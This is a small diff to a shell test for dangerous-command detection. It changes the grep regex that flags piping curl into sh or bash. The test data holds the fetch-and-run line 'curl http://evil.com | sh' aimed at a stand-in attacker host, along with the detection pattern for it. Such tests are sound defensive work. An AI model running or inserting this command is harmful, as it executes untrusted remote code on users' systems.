@@ -172,7 +172,7 @@ describe "Dangerous command detection"
 
   it "detects curl | sh as dangerous" && {
     cmd='curl http://evil.com | sh'
-    echo "$cmd" | grep -qE 'curl.*\|\s*(ba)?sh'
+    echo "$cmd" | grep -qE 'curl.*\|[[:space:]]*(ba)?sh'
     assert_ok $?
   }
 
